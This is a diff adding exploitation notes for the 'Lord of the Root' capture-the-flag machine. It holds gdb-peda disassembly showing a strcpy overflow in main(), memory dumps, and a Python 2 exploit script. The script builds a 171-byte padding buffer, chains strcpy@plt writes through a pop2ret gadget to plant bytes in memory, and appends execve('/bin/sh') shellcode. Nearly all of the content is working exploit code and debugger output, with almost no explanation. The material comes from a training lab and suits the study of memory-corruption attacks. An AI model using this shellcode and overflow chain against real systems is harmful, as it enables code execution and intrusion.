@@ -271,3 +271,83 @@ Start      End        Perm      Name
 0xb773e000 0xb773f000 r-xp      /lib/i386-linux-gnu/ld-2.19.so
 0xb773f000 0xb7740000 rwxp      /lib/i386-linux-gnu/ld-2.19.so
 0xbf980000 0xbf9a1000 rwxp      [stack]
+
+
+
+
+===
+
+
+http://barrebas.github.io/blog/2015/10/04/lord-of-the-root/
+
+Dump of assembler code for function main:
+   0x0804845d <+0>:     push   ebp
+   0x0804845e <+1>:     mov    ebp,esp
+   0x08048460 <+3>:     and    esp,0xfffffff0
+   0x08048463 <+6>:     sub    esp,0xb0
+   0x08048469 <+12>:    cmp    DWORD PTR [ebp+0x8],0x1
+   0x0804846d <+16>:    jg     0x8048490 <main+51>
+   0x0804846f <+18>:    mov    eax,DWORD PTR [ebp+0xc]
+   0x08048472 <+21>:    mov    eax,DWORD PTR [eax]
+   0x08048474 <+23>:    mov    DWORD PTR [esp+0x4],eax
+   0x08048478 <+27>:    mov    DWORD PTR [esp],0x8048540
+   0x0804847f <+34>:    call   0x8048310 <printf@plt>
+   0x08048484 <+39>:    mov    DWORD PTR [esp],0x0
+   0x0804848b <+46>:    call   0x8048340 <exit@plt>
+   0x08048490 <+51>:    mov    eax,DWORD PTR [ebp+0xc]
+   0x08048493 <+54>:    add    eax,0x4
+   0x08048496 <+57>:    mov    eax,DWORD PTR [eax]
+   0x08048498 <+59>:    mov    DWORD PTR [esp+0x4],eax
+   0x0804849c <+63>:    lea    eax,[esp+0x11]
+   0x080484a0 <+67>:    mov    DWORD PTR [esp],eax
+   0x080484a3 <+70>:    call   0x8048320 <strcpy@plt> <===
+   0x080484a8 <+75>:    mov    eax,0x0
+   0x080484ad <+80>:    leave  
+   0x080484ae <+81>:    ret    
+End of assembler dump.
+gdb-peda$ x/5i 0x8048320
+   0x8048320 <strcpy@plt>:      jmp    DWORD PTR ds:0x8049740
+   0x8048326 <strcpy@plt+6>:    push   0x8
+   0x804832b <strcpy@plt+11>:   jmp    0x8048300
+   0x8048330 <__gmon_start__@plt>:      jmp    DWORD PTR ds:0x8049744
+   0x8048336 <__gmon_start__@plt+6>:    push   0x10
+
+gdb-peda$ x/16wx _start
+0x8048360 <_start>:     0x895eed31      0xf0e483e1      0x68525450      0x08048520
+0x8048370 <_start+16>:  0x0484b068      0x68565108      0x0804845d      0xffffcfe8
+0x8048380 <_start+32>:  0x9066f4ff      0x90669066      0x90669066      0x90669066
+
+
+
+import struct
+
+def p(x):
+        return struct.pack('<L', x)
+
+
+
+def write(what, where):
+        # pop2ret = 0x804850e
+        return p(0x8048326) + p(0x804850e) + p(where) + p(what)
+buf = ""
+buf += "A" * 171
+
+sc = ""
+sc += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68"
+sc += "\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24"
+sc += "\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd"
+sc += "\x80\x31\xc0\xb0\x01\xcd\x80"
+
+
+mem = 0x08049040
+
+# x/16wx _start
+buf += write(0x8048380, mem)    # 0x8048380 0x9066f4ff
+#buf += write(0x8048366, mem+1) # 0x8048366 <_start+6>:   0x5450f0e4
+buf += write(0x8048461, mem+1)  # 0x8048461 <main+4>:     0xec81f0e4
+
+buf += p(mem)
+
+buf += sc
+print buf
+
